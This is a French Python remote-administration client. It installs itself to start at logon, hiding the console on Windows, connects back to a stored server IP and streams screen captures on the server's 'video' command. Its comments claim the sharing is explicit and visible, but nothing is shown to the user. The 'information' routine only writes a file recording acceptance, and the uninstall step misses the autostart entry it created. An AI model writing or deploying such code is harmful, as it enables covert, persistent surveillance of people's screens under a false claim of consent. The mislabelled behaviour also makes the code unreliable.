#!/usr/bin/env python3
# Client TCP d'administration avec partage d'écran explicite et visible.
# Le partage vidéo ne démarre qu'après la commande serveur « video ».

import argparse
import importlib.util
import json
import os
import platform
import socket
import struct
import subprocess
import shutil
import sys
import threading
import time
from datetime import datetime, timezone
from io import BytesIO
from pathlib import Path

PORT = 5000
VIDEO_PORT = 5001
APP_NAME = "clienttcp"
INFO_VERSION = "1"
SYSTEME = platform.system()

if SYSTEME == "Windows":
    CONFIG_DIR = Path(os.getenv("APPDATA", str(Path.home()))) / APP_NAME
else:
    CONFIG_DIR = Path.home() / ".config" / APP_NAME

AUTOSTART_DIR = Path.home() / ".config" / "autostart"
AUTOSTART_FILE = AUTOSTART_DIR / "clienttcp.desktop"
IP_FILE = CONFIG_DIR / "server_ip"
INFO_FILE = CONFIG_DIR / "information_supervision_acceptee.txt"
SERVICE_DIR = Path.home() / ".config" / "systemd" / "user"
SERVICE_FILE = SERVICE_DIR / "clienttcp.service"
TASK_NAME = "ClientTCP"
MAX_FRAME = 8 * 1024 * 1024
video_stop = threading.Event()
video_thread = None
video_lock = threading.Lock()



def preparer_dependances():
    modules = (("mss", "mss"), ("Pillow", "PIL"))

    if SYSTEME != "Linux":
        manquants = [
            nom for nom, module in modules
            if importlib.util.find_spec(module) is None
        ]
        if manquants:
            raise RuntimeError("Modules manquants : " + ", ".join(manquants))
        return

    # Si les dépendances sont déjà installées, aucun su nécessaire.
    if all(
        importlib.util.find_spec(module) is not None
        for _, module in modules
    ):
        return

    venv_dir = CONFIG_DIR / "venv"
    python_venv = venv_dir / "bin" / "python"

    # Créer l'environnement uniquement s'il n'existe pas.
    if not python_venv.exists():
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)

        creation = subprocess.run(
            [sys.executable, "-m", "venv", str(venv_dir)],
            capture_output=True,
            text=True
        )

        # Demander su uniquement si Debian ne permet pas
        # de créer l'environnement Python.
        if creation.returncode != 0:
            print("[INSTALL] Installation de python3-venv nécessaire.")
            print("[INFO] Saisis le mot de passe root.")

            subprocess.run(
                ["su", "-c",
                 "apt-get update && apt-get install -y python3-venv"],
                check=True
            )

            subprocess.run(
                [sys.executable, "-m", "venv", str(venv_dir)],
                check=True
            )

    # Installer les modules sans droits administrateur.
    manquants = []

    for nom, module in modules:
        resultat = subprocess.run(
            [str(python_venv), "-c", f"import {module}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if resultat.returncode != 0:
            manquants.append(nom)

    if manquants:
        print("[INSTALL] Installation :", ", ".join(manquants))
        subprocess.run(
            [
                str(python_venv), "-m", "pip", "install",
                "--disable-pip-version-check", "mss", "Pillow"
            ],
            check=True
        )

    # Relancer avec l'environnement dédié.
    os.execv(
        str(python_venv),
        [str(python_venv), str(Path(__file__).resolve()), *sys.argv[1:]]
    )

def afficher_information_installation():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    INFO_FILE.write_text(f"{INFO_VERSION}\n{datetime.now(timezone.utc).isoformat()}\n", encoding="utf-8")


def enregistrer_ip(ip):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    IP_FILE.write_text(ip, encoding="utf-8")


def lire_ip():
    return IP_FILE.read_text(encoding="utf-8").strip() if IP_FILE.exists() else None


def verifier_connexion(ip):
    try:
        with socket.create_connection((ip, PORT), timeout=5):
            return True
    except OSError:
        return False

def installer_demarrage_linux():
    AUTOSTART_DIR.mkdir(parents=True, exist_ok=True)

    python = sys.executable
    script = Path(__file__).resolve()

    contenu = f"""[Desktop Entry]
Type=Application
Name=Client TCP
Comment=Client TCP - démarrage automatique
Exec="{python}" "{script}" --client
Terminal=false
X-GNOME-Autostart-enabled=true
"""

    AUTOSTART_FILE.write_text(contenu, encoding="utf-8")

def installer_demarrage():
    python = sys.executable
    script = Path(__file__).resolve()

    if SYSTEME == "Linux":
        if SYSTEME == "Linux":
            installer_demarrage_linux()

    elif SYSTEME == "Windows":

        pythonw = Path(python).with_name("pythonw.exe")

        # Utiliser Python sans fenêtre de console.
        executable = str(pythonw if pythonw.exists() else Path(python))

        commande = f'"{executable}" "{script}" --client'

        subprocess.run(
            [
                "schtasks",
                "/Create",
                "/TN", TASK_NAME,
                "/TR", commande,
                "/SC", "ONLOGON",
                "/RL", "LIMITED",
                "/IT",
                "/F"
            ],
            check=True
        )

        # Démarrage immédiat sans attendre la prochaine connexion.
        subprocess.run(
            ["schtasks", "/Run", "/TN", TASK_NAME],
            check=True
        )

    else:
        raise OSError(f"Système non supporté : {SYSTEME}")

def desinstaller_demarrage():
    if SYSTEME == "Linux":
        subprocess.run(["systemctl", "--user", "disable", "--now", "clienttcp.service"], check=False)
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
        SERVICE_FILE.unlink(missing_ok=True)
    elif SYSTEME == "Windows":
        subprocess.run(["schtasks", "/Delete", "/TN", TASK_NAME, "/F"], check=False)


def adresse_ipv4():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sonde:
            sonde.connect(("192.0.2.1", 80))
            return sonde.getsockname()[0]
    except OSError:
        return ""


def envoyer(sock, message):
    sock.sendall((message.replace("\n", " | ") + "\n").encode("utf-8"))



def boucle_capture(ip):
    try:
        import mss
        from PIL import Image
    except ImportError:
        print("[VIDEO] Dépendances vidéo manquantes.")
        return

    client_id = socket.gethostname()[:128]

    try:
        with socket.create_connection((ip, VIDEO_PORT), timeout=10) as flux:
            flux.settimeout(10)

            flux.sendall(
                (json.dumps({"client_id": client_id}) + "\n").encode("utf-8")
            )

            with mss.MSS() as captureur:
                moniteur = captureur.monitors[1]

                while not video_stop.is_set():
                    debut = time.monotonic()

                    shot = captureur.grab(moniteur)
                    image = Image.frombytes("RGB", shot.size, shot.rgb)

                    if image.width > 1280:
                        hauteur = max(
                            1,
                            round(image.height * 1280 / image.width)
                        )
                        image = image.resize((1280, hauteur))

                    tampon = BytesIO()
                    image.save(
                        tampon,
                        format="JPEG",
                        quality=65,
                        optimize=True
                    )

                    donnees = tampon.getvalue()

                    if len(donnees) > MAX_FRAME:
                        continue

                    flux.sendall(
                        struct.pack("!I", len(donnees)) + donnees
                    )

                    # Maximum 25 images par seconde.
                    attente = 0.04 - (time.monotonic() - debut)

                    if attente > 0:
                        video_stop.wait(attente)

    except Exception as erreur:
        print(f"[VIDEO] Erreur de capture : {erreur}")


def demarrer_video(ip):
    global video_thread
    with video_lock:
        if video_thread and video_thread.is_alive():
            return ""
        video_stop.clear()
        video_thread = threading.Thread(target=boucle_capture, args=(ip,), daemon=True, name="partage-ecran")
        video_thread.start()
    return ""


def arreter_video():
    video_stop.set()
    return ""


def traiter_commande(commande, ip):
    if commande == "ping": return "pong"
    if commande == "hostname": return socket.gethostname()
    if commande == "system": return f"{platform.system()} {platform.release()}"
    if commande == "ip": return adresse_ipv4()
    if commande == "aide": return "Commandes : ping, hostname, system, ip, aide, video, stopvideo, quitter"
    if commande == "video": return demarrer_video(ip)
    if commande == "stopvideo": return arreter_video()
    if commande == "quitter":
        arreter_video()
        return "Au revoir"
    return "Commande non reconnue"


def lancer_client(ip):
    while True:
        try:
            with socket.create_connection((ip, PORT), timeout=10) as client:
                client.settimeout(None)
                with client.makefile("r", encoding="utf-8") as lecture:
                    while True:
                        ligne = lecture.readline()
                        if not ligne:
                            break
                        commande = ligne.strip().lower()
                        reponse = traiter_commande(commande, ip)
                        envoyer(client, reponse)
                        if commande == "quitter":
                            return
        except (OSError, UnicodeError):
            time.sleep(10)


def main():
    parser = argparse.ArgumentParser(description="Client TCP avec partage d'écran commandé et visible")
    parser.add_argument("ip", nargs="?", help="Adresse IPv4 du serveur")
    parser.add_argument("--client", action="store_true", help="Mode client TCP")
    parser.add_argument("--uninstall", action="store_true", help="Désinstalle le démarrage automatique")
    args = parser.parse_args()
    if args.uninstall:
        desinstaller_demarrage()
        return
    preparer_dependances()
    if args.client:
        ip = lire_ip()
        if not ip:
            raise SystemExit(1)
        lancer_client(ip)
        return
    if not args.ip:
        parser.print_help()
        raise SystemExit(1)
    try:
        socket.inet_aton(args.ip)
    except OSError:
        parser.error("Adresse IPv4 invalide.")
    if not verifier_connexion(args.ip):
        raise SystemExit("Installation annulée : serveur inaccessible.")
    try:
        afficher_information_installation()
        enregistrer_ip(args.ip)
        installer_demarrage()
    except (OSError, subprocess.CalledProcessError, RuntimeError) as erreur:
        raise SystemExit(f"Installation impossible : {erreur}")
    lancer_client(args.ip)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        arreter_video()
